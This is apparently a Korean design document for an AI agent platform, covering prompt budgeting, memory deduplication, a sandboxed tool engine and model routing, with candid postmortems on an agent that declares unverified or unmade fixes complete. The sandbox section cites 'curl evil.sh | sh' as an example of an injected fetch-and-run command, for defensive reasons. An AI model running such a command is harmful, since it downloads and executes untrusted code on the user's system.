# 8~11. Prompt Engine / Memory Engine / Tool Engine / AI Router

코드: [packages/ai](../packages/ai), [packages/memory](../packages/memory), [packages/tools](../packages/tools)

## 8. Prompt Engine

문제: 컨텍스트 윈도우는 유한한데 넣고 싶은 것(시스템 지침, LTM, STM 요약, RAG 청크, 히스토리, 도구 스펙)은 무한하다. → **우선순위 기반 토큰 예산 할당기**로 푼다.

```
[priority 100] system core (필수)
[priority 90]  tool specs (도구 활성 시 필수)
[priority 80]  LTM facts (상위 k개, 점수순 절단 가능)
[priority 70]  RAG chunks (점수순 절단 가능)
[priority 60]  STM summary
[priority 50]  recent history (오래된 것부터 절단)
[priority 100] user message (필수)
```

핵심 설계 결정:
1. **섹션 순서는 항상 동일(안정된 prefix)** — OpenAI/Anthropic의 프롬프트 캐싱은 prefix 일치 기반이다. 시스템·도구 섹션을 앞에 고정하면 멀티턴에서 캐시 적중 → 입력 비용 최대 90% 절감. 이것이 비용 분석(13장)의 최대 절감 항목이다.
2. **절단은 섹션 내부에서, 점수 낮은 항목부터** — 섹션 자체를 통째로 빼면 모델 행동이 급변한다.
3. 토크나이저: 근사치(chars/4 + CJK 보정)로 시작. 이유: tiktoken 정확 계산은 프로바이더별로 다르고 비싸다. 예산에 10% 마진을 두면 근사로 충분하며, 초과 시 프로바이더가 반환하는 usage로 보정 루프를 돈다.

## 9. Memory Engine

```
Short-term (Redis)                     Long-term (pgvector)
┌────────────────────────┐  압축      ┌──────────────────────────┐
│ 세션별 메시지 윈도우     │ ───────→  │ facts / preferences /     │
│ + rolling summary       │  추출      │ decisions / summaries     │
│ TTL 7d, 토큰 예산 관리   │ (비동기잡) │ 스코프: org/user/project   │
└────────────────────────┘            └──────────────────────────┘
```

**STM**: 세션당 Redis 리스트. 예산(기본 8k 토큰) 초과 시 가장 오래된 절반을 저가 모델로 요약해 rolling summary에 병합. 이유 — Redis인 까닭: STM은 매 요청 경로에 있으므로 p99 1ms급이어야 하고, 세션 종료 후 가치가 급감하므로 TTL 자연 소멸이 맞다. Postgres에 두면 hot path에 디스크 왕복이 들어간다.

**LTM**: 대화 종료 시 비동기 잡이 사실(fact) 추출 → 임베딩 → 저장.
- **중복 제거**: 저장 전 top-1 유사도 ≥ 0.90이면 insert 대신 기존 항목 갱신(중요도 상향). 이유: 메모리는 쓰기보다 읽기가 100배 많고, 중복된 기억은 recall 상위권을 오염시킨다.
- **recall 점수** = `0.6·cosine + 0.25·importance + 0.15·recency(반감기 30일)`. 순수 유사도만 쓰면 1년 전의 폐기된 결정이 계속 소환된다. 인간 기억의 강화/망각을 단순 산식으로 모사.
- **망각**: 90일 무접근 + importance<0.3 항목은 주간 잡이 정리. 무한 축적은 recall 품질과 비용을 동시에 해친다.

## 10. Tool Engine

- **Registry**: zod 스키마로 도구 정의 → JSON Schema로 변환해 각 프로바이더 포맷에 주입. 단일 정의, 4개 프로바이더 지원.
- **정책**: 도구마다 `permission: read|write|exec|net`. 실행 모드 `auto|confirm|deny`를 permission별로 설정. `exec`은 기본 confirm — 에이전트의 임의 명령 실행은 사용자 승인 없이는 안 된다.
- **샌드박스**: `run_command`는 `docker run --network=none --memory=512m --cpus=1 --pids-limit=256 --read-only(+tmpfs)` 로 실행. 이유: LLM이 생성한 명령은 정의상 신뢰 불가 입력이다. 프롬프트 인젝션으로 `curl evil.sh | sh`가 나와도 네트워크 차단·리소스 제한·비루트로 폭발 반경을 가둔다.
- **모든 호출 감사 로그** (tool_invocations): 사후 분석과 컴플라이언스의 기반.
- **MCP**: stdio(JSON-RPC, newline-delimited) 클라이언트 내장. 외부 MCP 서버의 도구를 `mcp__<server>__<tool>`로 Registry에 투영 — 우리 도구와 동일한 정책·감사 경로를 태운다. MCP를 지원하는 이유: 도구 생태계를 우리가 다 만들 수 없다. 표준 프로토콜에 올라타는 것이 마켓플레이스보다 빠른 생태계 확보 수단.
- **Git 자동 커밋**: 에이전트의 파일 변경 턴이 끝나면 체크포인트 커밋(`[aios]` 트레일러). 이유: 에이전트 편집은 되돌릴 수 있어야 신뢰할 수 있다. 커밋 단위가 곧 undo 단위.

## 11. AI Router

2단계: **후보 필터링 → 점수화**.

필터: 컨텍스트 길이 충족, 도구 지원 여부, 사용자 지정 제약(모델 고정, 비용 상한), 서킷브레이커 open 제외.

점수:
```
품질 우선(code/chat/reasoning):
score = 0.55·quality(tier/3 + taskClass 태그 보너스)
      - 0.10·normCost(요청 예상 토큰 × 단가, 후보 내 0..1 정규화)
      - 0.15·normLatency(EWMA TTFT)
      + 0.10·health(성공률)

비용 우선(cheap/summarize):
score = 0.15·quality - 0.60·normCost - 0.15·normLatency + 0.10·health
```
가중치 근거: 코딩 에이전트는 품질 실패(잘못된 편집)의 복구 비용이 토큰 비용보다 훨씬 크다 → quality 최대 가중. 모델 간 비용의 동적 범위는 10~50배라 선형 정규화된 비용 항이 품질 항을 압도하기 쉬우므로, 품질 우선 작업에서 비용 가중치는 0.10으로 억제한다(이 수치는 단위 테스트 `router.test.ts`가 회귀를 감시). taskClass가 `cheap|summarize`면 비용 가중이 0.60으로 역전된다 — 요약에 프론티어 모델을 쓰는 낭비 차단.

- **서킷브레이커**: `provider:model` 단위, 실패 5회/30초 → open 60초 → half-open 1회 시도. 프로바이더 장애는 상시 발생(529/429) — 브레이커 없으면 장애 프로바이더에 계속 지연을 지불한다.
- **폴백**: 첫 토큰 전 실패만 다음 후보로 투명 재시도. 첫 토큰 후에는 에러를 정직하게 노출(모델 교체 이어쓰기는 일관성 붕괴).
- **스트리밍 정규화**: 4사 이벤트 포맷을 `StreamEvent` 하나로 통일. 상위 레이어(Orchestrator/클라이언트)는 프로바이더를 모른다.
- **사용량 훅**: 모든 usage 이벤트 → `usage_events` + Redis 월 카운터(쿼터 체크는 DB가 아닌 Redis에서 — hot path).

## 중복제거 임계값은 임베더에 종속된다 — 상수로 두면 조용히 데이터가 사라진다

장기기억은 새 기억을 저장하기 전에 최근접 이웃을 보고, 충분히 비슷하면 기존 기억을
갱신한다. 임계값은 `0.9` 였다. OpenAI 임베딩을 전제로 고른 값이다.

임베더를 로컬 bge-m3 로 바꾼 뒤, 대량 적재 검증에서 이런 줄이 나왔다:

```
wrote 500 facts in 66844ms; 100 duplicates → 93 deduped; corpus 39 rows
```

**서로 다른 사실 500개가 39행이 됐다.** 그런데 당시 단언은 통과했다 —
`corpus_size_correct` 가 상한(`<= 520`)만 봤기 때문이다.
행이 적은 것은 "중복 제거가 잘 됐다"로 읽혔다. 실제로는 데이터가 사라진 것이었다.

### 왜 임계값 조정으로 해결되지 않는가

bge-m3 로 두 방향을 실측했다:

| | 유사도 범위 |
|---|---|
| 병합되어야 하는 쌍 (같은 사실, 다른 표현) | 0.8959 ~ 0.9688 |
| 보존되어야 하는 쌍 (다른 사실, 같은 형태) | 0.8468 ~ **0.9633** |

**두 분포가 겹친다.** 구체적으로:

```
0.9633  "배포는 매주 화요일에 한다."  vs  "배포는 매주 목요일에 한다."   ← 다른 사실
0.9520  "배포는 매주 화요일에 한다."  vs  "매주 화요일이 배포일이다."    ← 같은 사실
```

**다른 사실 쌍이 같은 사실 쌍보다 더 유사하다.** 어떤 단일 임계값으로도 가를 수 없다.
이것은 튜닝 문제가 아니라 신호 자체의 한계다. 문장 형태가 같고 값만 다른 기억
(요일, 날짜, 버전, 임계치, 지명, 언어 이름)에서 일관되게 나타난다.

### 그래서 코사인만으로 파기하지 않는다

```
1단계  정규화 완전일치 (NFC + 공백 정리 + 소문자)
       → 임베더와 무관하게 항상 옳다. 유사도가 얼마든 병합한다.

2단계  코사인 ≥ 임계값  AND  두 텍스트의 수치 다중집합이 동일
       → 기본 0.97 (보존 쪽 실측 최댓값 0.9633 위).
         값 교체형(3월/4월, variant 42/47)은 수치 검사에서 먼저 걸린다.

그 외  저장한다.
```

**덜 병합하는 쪽으로 기운다.** 중복 한 줄은 잡음이고 랭킹이 흡수하지만,
지워진 기억은 복구되지 않는다. 두 오류의 비용이 대칭이 아니다.

임계값은 `MEMORY_DEDUPE_THRESHOLD` 로 배포마다 조정한다. 라이브러리는 `process.env` 를
읽지 않고 생성자 옵션으로 받는다 — 임베더를 바꾸는 것은 배포 결정이지 코드 결정이 아니다.

수정 후 같은 검증:

```
wrote 500 facts in 34369ms; 100 duplicates → 100 deduped; corpus 500 rows
PASS  ltm.dedupe_at_scale        100/100
PASS  ltm.corpus_size_correct    500 rows (하한 495 추가 — 상한만 보면 소실을 못 잡는다)
PASS  ltm.recall_finds_target    사라졌던 'variant 42' 가 다시 검색된다
```

`packages/memory/src/__tests__/dedupe.test.ts` 가 실측값(0.9633, 0.975)을 그대로 박아
회귀를 막는다.

## 임베딩 처리량 — 배치를 만들려다 반증을 얻었다

성능 계측에서 로컬 임베더가 병목(동시성 25에서 p95 943ms)으로 드러났고,
`recall()` 을 `recallByVector()` 로 쪼개 둔 덕에 배치 임베딩을 넣을 자리가 생겼다.
그래서 배치를 재 봤다. **더 느렸다.**

```
64개 텍스트 임베딩 (bge-m3, Ollama)
  ① 1건씩 순차 64회            3675ms   17.4 텍스트/s
  ② 1건씩 동시 4 (현재 방식)     1732ms   36.9 텍스트/s
  ③ 배치  8건씩 1요청           2026ms   31.6 텍스트/s
  ③ 배치 32건씩 1요청           2408ms   26.6 텍스트/s
```

Ollama 는 이미 **요청 단위로** 병렬 처리한다. 배치 하나는 한 슬롯 안에서 순차 처리되므로
병렬성을 오히려 버린다. 배치가 이득인 것은 왕복 비용이 지배하는 원격 API 쪽이다.

### 그러면 무엇을 고쳤나 — 그리고 무엇을 고치지 못했나

동시성을 훑어 보니 다른 그림이 나왔다. 순서 효과를 걸러내려고 정순·역순 두 번 쟀다:

```
동시성   p95(정순/역순)      처리량(정순/역순)
     1    77ms /   85ms      13.7 / 13.4 /s
     4   164ms /  169ms      26.4 / 28.3 /s   ← 처리량 포화
     8   512ms /  271ms      21.9 / 32.0 /s
    25  1145ms /  759ms      23.3 / 32.2 /s
```

- **처리량은 4에서 포화한다.** 더 올려도 얻는 게 없다 — 실행 간 편차에 묻힌다.
- **지연은 동시성에 비례한다.** 4 → 25 에서 p95 가 5~7배.

그래서 `LocalAdapter.embed` 에 FIFO 세마포어로 상한 4를 걸었다.
얻는 것은 **속도가 아니라 예측 가능성**이다 — 추론 서버 큐가 무한정 깊어지지 않고,
같은 Ollama 를 쓰는 채팅 요청이 임베딩 폭주에 굶지 않는다.

**정직하게 말하면, 대량 임베딩은 빨라지지 않았다.** 한 호출자가 25건을 동시에 던지면
대기가 서버 큐에서 우리 큐로 옮겨올 뿐 전체 시간은 그대로다(실측 2692ms → 2605ms).

**로컬 임베더의 천장은 ~30 텍스트/s 이고, 그것을 정하는 것은 CPU 위의 모델 자체다.**
클라이언트 쪽에서 올릴 방법은 없다. 더 필요하면 GPU 를 붙이거나 임베더를 바꾸는
배포 결정이지, 코드로 풀 문제가 아니다.

### 처음 쓴 수치를 정정한다

첫 측정에서 "동시성 25는 4 대비 처리량 62%"라고 적었다가, 역순으로 다시 재 보니
재현되지 않았다(c=25 에서 23~32/s 로 편차가 크다). 첫 측정은 동시성을 낮은 쪽부터
훑어 c=25 가 마지막이었고, 그 순서 효과를 걸러내지 못한 값이었다.
**두 순서에서 모두 재현되는 것은 지연 쪽 결론뿐이므로, 그것만 근거로 남긴다.**

## 자기 수정을 확인하지 않는 에이전트

전체 제품 시나리오에서 이렇게 실패했다:

```
PASS  s4.agent_edited — write_file called 1 time(s)
FAIL  s5.suite_passes_after_repair — FAIL invoiceTotal with tax: got 84, want 44
```

에이전트는 결함을 찾아 코드를 고쳤다. **그런데 그 수정이 틀렸다** —
소계 40에 세금 10%를 적용하면 44인데 84가 나왔다(세금 적용분을 소계에 다시 더한 형태).
그리고 에이전트는 그 상태로 "완료"를 선언했다.

시스템은 정상 동작했다. 테스트 러너가 틀린 코드를 정확히 잡았고, 도구·감사 로그·커밋도
모두 제 역할을 했다. **빠진 것은 지시였다** — "고쳤으면 확인하라".

### 프롬프트를 고쳤다, 검증 시나리오가 아니라

시나리오는 `SYSTEM_CORE_TEMPLATE` 을 그대로 쓴다. 시나리오 쪽 프롬프트만 손봤다면
그건 테스트를 통과시키려고 테스트를 고치는 것과 다르지 않다. 제품 프롬프트에 넣었다.

```
- After changing code, verify the change with whatever the project provides —
  run its tests, type check, or execute the command you fixed. Read the result.
- Do not report a fix as done until you have SEEN it pass. If the check still fails,
  keep working: read the failure, correct the code, and check again.
  An edit you have not verified is a guess.
```

**두 줄로 나눈 이유:** "검증하라"만으로는 부족하다. 모델이 테스트를 돌려 실패를 본 뒤에도
완료를 선언할 수 있다 — 이번 실패가 정확히 그 형태였다. 두 번째 줄이 그것을 막는다.

**"항상 테스트를 돌려라"로 쓰지 않은 이유:** 코드가 아닌 편집이나 테스트가 없는 프로젝트에서는
틀린 지시가 된다. 프로젝트가 제공하는 검증 수단이 있을 때로 한정했다.

### 프롬프트 문구를 테스트로 고정한다

프롬프트는 코드처럼 리팩터링되는데 **문구 하나가 빠져도 컴파일은 통과한다.**
`packages/ai/src/__tests__/prompt.test.ts` 에 세 가지를 건다 —
검증 지시가 있는가, "확인 전 완료 선언 금지"가 있는가, 렌더링 후에도 남는가.

### 결과

수정 후 도구 순서가 달라졌다:

```
run_tests → read_file → write_file → run_tests    ← 마지막 run_tests 가 새로 생겼다
PASS  s5.suite_passes_after_repair — ok invoiceTotal with tax: got 44, want 44 | SUITE PASSED
Full product scenario: PASS (22/22)
```

### 그리고 측정이 이 수정을 기각했다

1회 통과로 만족하지 않고 두 번 더 돌렸다. 결과가 결론을 뒤집었다.

| 실행 | 도구 순서 | 결과 |
|---|---|---|
| 1 | `run_tests → read_file → write_file → run_tests` | PASS 22/22 |
| 2 | `run_tests → read_file → write_file` | PASS 22/22 |
| 3 | `run_tests → read_file` | **FAIL 15/22** |

**실행 2는 최종 검증을 하지 않았는데도 통과했다.** 즉 실행 1의 마지막 `run_tests` 는
프롬프트의 효과라고 말할 수 없다 — 우연과 구분되지 않는다.

수정 전 5/7, 수정 후 2/3. 이 표본으로는 **개선을 주장할 수 없다.**

### 진짜 실패 형태는 다른 것이었다

새로 넣은 진단(실패 시 모델의 마지막 발화를 남긴다)이 답을 줬다:

```
s4.agent_edited — write_file called 0 time(s) — 2턴, 도구 [run_tests, read_file],
모델의 마지막 응답: "To resolve the failures in the test, we will:
### ✅ Step 1: Fix `lineTotal()` Function
The `lineTotal()` function currently returns the sum of `item.price` and `item.qty`,
which is incorrect..."
```

**모델은 버그를 정확히 진단했다.** 그리고 고치겠다고 *설명했다*. 도구는 부르지 않았다.

즉 주된 실패는 "수정이 틀림"이 아니라 **"고치겠다고 말하고 안 고침"** 이다.
이건 "고쳤으면 확인하라"는 지시로 막을 수 있는 종류가 아니다 —
확인할 수정 자체가 없다.

### 프롬프트 규칙은 남긴다, 다만 주장은 철회한다

"수정 후 검증하라"는 지시 자체는 옳다. 더 큰 모델에서는 유효할 것이고,
잘못된 지시도 아니다. **다만 이것이 7B 의 이 실패를 고친다는 주장은 근거가 없다.**
근거 없는 주장을 문서에 남기면 다음 사람이 그것을 사실로 믿는다.

구조적 강제(모델의 협조 없이 시스템이 보장하는 방법)는 별도 설계 결정이 필요하다 —
루프가 "미완"을 판정할 방법이 필요한데, 채팅 제품에서 그 판정자는 보통 사용자다.

## 완료 판정 게이트 — 모델의 협조에 기대지 않는 장치

프롬프트가 기각된 뒤 구조적 강제를 넣었다. 핵심은 **'완료'의 정의를 호출자가 준다**는 것이다.

```ts
const fix = await runAgent(system, "테스트가 통과하도록 고쳐라", ctx, 10,
  async () => {
    const run = await executor.execute(ctx, { name: "run_tests", ... });
    const passed = run.output.includes("SUITE PASSED") && !run.output.includes("FAIL ");
    return { done: passed, reason: run.output };
  });
```

모델이 멈추면 시스템이 이 함수를 부른다. 미완이면 실패 내용을 대화에 붙여 루프를 이어 간다.
모델이 "확인하겠다"고 약속할 필요가 없다 — 시스템이 확인한다.

### 범용 휴리스틱을 쓰지 않은 이유

"도구를 안 불렀으면 다그친다" 같은 규칙이 더 간단해 보인다. 그러나 단순 질문
("이 코드 뭐야?")에서 잘못 발동한다. **무엇이 완료인지는 작업마다 다르고, 그것을 아는 것은
루프가 아니라 호출자다.** 판정자가 없으면 게이트도 없다 — 그게 옳은 기본값이다.

### 판정 규칙에서 신경 쓴 것

| 상황 | 동작 | 왜 |
|---|---|---|
| 판정자 없음 | 끝낸다 | 모르는 채 다그치면 오작동한다 |
| 완료 | 끝낸다 | 당연 |
| 미완 + 상한 미만 | 실패 내용을 붙여 이어 간다 | 모델이 무엇을 고칠지 알아야 한다 |
| 미완 + 상한 도달 | 끝낸다 | 같은 실패 무한 반복이 최악이다 |
| **판정이 예외를 던짐** | **끝낸다** | 미완으로 단정하면 판정 버그 하나가 무한 재시도로 번진다 |

재시도 상한은 2다. 개입은 `incomplete` 이벤트로 내보낸다 — 조용히 재시도하면
사용자는 왜 응답이 길어지는지 모르고 로그에도 남지 않는다.

### 실행만으로는 이 장치를 검증할 수 없었다

게이트를 넣고 3회 돌렸다. 결과는 PASS / PASS / FAIL(다른 단계) 이었는데,
**게이트는 세 번 다 한 번도 발동하지 않았다** — 모델이 매번 스스로 `write_file` 을 불렀다.

```
tool sequence: run_tests → read_file → write_file → run_tests (게이트 개입 없음)
```

즉 "통과했다"는 사실이 게이트가 동작한다는 증거가 되지 못한다.
비결정적인 대상에 대고 실행을 반복하면, 장치가 켜져 있는지조차 알 수 없는 결과가 나온다.

그래서 판정 로직을 순수 함수(`evaluateCompletion`)로 빼내 **결정론적으로 전수 시험**했다.
루프 통합 시험은 "1턴에 산문만 쓰고 멈추는 모델"을 세우고,
게이트가 정확히 한 번 개입해 실제 편집까지 끌고 가는 것을 확인한다.

순수 함수로 뺀 것은 시험만을 위한 것이 아니다 — 이 판정은 제품 오케스트레이터와
검증 하네스 두 곳에서 쓰이고, **이번 작업에서만 배선이 두 벌이라 갈라진 사례를
두 번 겪었다**(docker run 환경변수, 사실 추출 파싱).

### 지금 말할 수 있는 것과 없는 것

- **말할 수 있다:** 판정 규칙은 옳고, 산문만 쓰고 멈추는 모델을 완료까지 끌고 간다(결정론적 시험).
- **말할 수 없다:** 이 게이트가 실제 7B 운용에서 통과율을 얼마나 올리는지.
  게이트가 발동하는 실행을 아직 관측하지 못했다. 그 수치를 주장하려면 더 많은 관측이 필요하다.


### 게이트가 4회 실행 내내 켜지지 않은 이유 — 턴 소진 경로

게이트를 넣고 관측을 쌓았는데 **한 번도 발동하지 않았다.**

```
tool sequence: run_tests → read_file → write_file → run_tests (게이트 개입 없음)
```

배선은 옳았다. 문제는 게이트가 **"모델이 스스로 멈췄을 때"만** 돈다는 것이었다:

```ts
if (!calls.length || stop !== "tool_use") {   // ← 여기서만 게이트가 돈다
  const gate = await evaluateCompletion(...);
}
```

모델이 최대 턴을 전부 도구 호출로 소진하면 이 분기를 타지 않는다.
`for` 루프가 조용히 끝나고, **호출자는 완료된 줄 안다.**

수리가 실패한 실행(`got 80.04, want 44`)에서 게이트 개입 흔적이 없었던 것이
이 경로로 설명된다. 재시도할 턴은 이미 없었지만, 그렇다고 **미완이라는 사실까지
숨겨서는 안 된다** — 조용한 미완은 조용한 실패로 이어진다.

고침: 루프가 **어떤 이유로 끝났든** 완료 여부를 한 번 더 확정한다.
제품 오케스트레이터는 `incomplete` 이벤트를 내보내고, 검증 하네스는 `completed` 를 돌려준다.

그리고 실패 메시지에 판단 재료를 전부 담는다:

```
{turns}턴/최대10(소진), 게이트 개입 {n}회, 루프 종료 시 완료판정={bool}
— 에이전트가 쓴 구현: ...
```

다음에 같은 실패가 나면 "모델이 못 고친 것"인지 "게이트가 안 돈 것"인지
한 줄로 갈린다. 이번에는 그것을 구분하지 못해 네 번을 헛돌았다.
